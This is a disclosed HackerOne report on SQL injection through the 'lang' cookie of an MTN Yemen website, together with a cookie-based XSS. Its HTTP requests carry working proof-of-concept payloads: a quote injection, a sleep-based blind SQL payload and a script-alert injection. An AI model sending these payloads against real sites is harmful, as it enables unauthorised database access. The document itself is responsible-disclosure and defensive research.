---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
  - vuln/sql-injection
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2020-05-03
submitted: 2019-12-18T21:54:24.783Z
bounty_usd: null
votes: 323
cve: []
program: "[[programs/mtn_group|MTN Group]]"
reporter: "w31rd0"
source: "https://hackerone.com/reports/761304"
title: " SQL Injection on cookie parameter"
---
#  SQL Injection on cookie parameter

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 323 | **Program:** MTN Group | **Disclosed:** 2020-05-03

- Report: [https://hackerone.com/reports/761304](https://hackerone.com/reports/761304)
- CWE: SQL Injection
- Submitted: 2019-12-18T21:54:24.783Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
Hello team. It seams one of the parameters in the cookies is vulnerable to SQL injection. Below requests has the lang parameter in cookies. If you inject one quote mark like '. You get SQL error with the syntax. By injecting a second you have the error removed.
I did not attempt to exfiltrate data as this is obvious indication of SQLi.

```
GET /index.php/search/default?t=1&x=0&y=0 HTTP/1.1
Host: mtn.com.ye
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=en'; _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1; _gat_UA-44336198-10=1
Upgrade-Insecure-Requests: 1
```

I would like to ask for permission for further exploiting this issue.

## Impact

Web application is vulnerable to SQL injection, allowing access to data

## Timeline

- **Report Filed**
- **2019-12-18** @w31rd0: you can inject further queries to confirm. e.g. '%2b(select*from(select(sleep(20)))a)%2b'
will make response be delayed
- **2019-12-18** @w31rd0: Also cookie allows XSS as can be observer in attached screenshot F663256. This is a bit harder to execute as it requires someone to set the vale of that cookie to  that value (maybe MiTM attack - which are in scope in your program as i can see).
The following request can be used in burp to confirm the issue. 
1) Copy paste below request into burp and send.
2) Right click on response and select Request in browser -> in original session.
3) Copy paste the link into the browser and you ll get the popup

```
GET /index.php/search/default?t=1&x=0&y=0 HTTP/1.1
Host: mtn.com.ye
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=ens4tgl%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3ecyfn9; _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1; _gat_UA-44336198-10=1
Upgrade-Insecure-Requests: 1
```
- **2019-12-19** @w31rd0: Τhis issue might be ranked Critical as well. I was able to get table names. No data exfiltrated yet though. Waiting to confirm permission to proceed with the attack
- **Report Triaged**
- **2019-12-20** @w31rd0: Hello @cybersecurity_7ibu8 
Thank you for the reply. Let me know if you need further information.
Is it ok with your side if i attempt to see what kind of data can i access via this attack scenario?
Also once confirmed can we escalate to critical?
- **2020-01-06** @w31rd0: @cybersecurity_7ibu8 any update on this?
This is a critical issue i think as you can get access on the web application's database content (admin table and few others included), and when checking a couple of days ago the issue still exists.
- **2020-03-04** @w31rd0: Hello @cybersecurity_7ibu8.
Seems this issue is fixed but still in triage, Any update?
- **Report Resolved**
- **Agreed On Going Public**
- **2020-04-09** @w31rd0: any update on this request? @vancora
- **Report Became Public**
